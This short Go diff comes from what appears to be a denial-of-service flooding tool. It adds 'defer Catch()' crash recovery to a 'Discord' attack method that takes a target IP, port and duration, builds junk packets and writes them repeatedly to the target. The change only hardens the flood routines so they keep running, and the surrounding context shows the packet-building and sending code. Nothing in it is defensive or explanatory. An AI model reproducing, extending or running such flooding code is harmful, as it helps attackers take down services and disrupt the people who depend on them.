@@ -11,6 +11,8 @@ import (
 
 func Discord(target string, port string, duration string) {
 
+	defer Catch()
+
 	duration = strings.ReplaceAll(duration, "\x00", "")
 	duration = strings.ReplaceAll(duration, "\x03", "")
 	duration = strings.ReplaceAll(duration, "\r", "")
@@ -30,6 +32,7 @@ func Discord(target string, port string, duration string) {
 }
 
 func discord(_target string, _port string) {
+	defer Catch()
 DISCORD:
 
 	target := net.ParseIP(_target)
@@ -67,6 +70,7 @@ DISCORD:
 }
 
 func senddispacket(conn net.Conn, size, offset int) {
+	defer Catch()
 	packet := createPacket(size, offset)
 	_, err := conn.Write(packet)
 
@@ -78,6 +82,7 @@ func senddispacket(conn net.Conn, size, offset int) {
 
 // for discord method only
 func createPacket(len, offset int) []byte {
+	defer Catch()
 	data := []byte{0x13, 0x37, 0xca, 0xfe, 0x01, 0x00, 0x00, 0x00}
 
 	for i := 0; i <= len-offset; i++ {
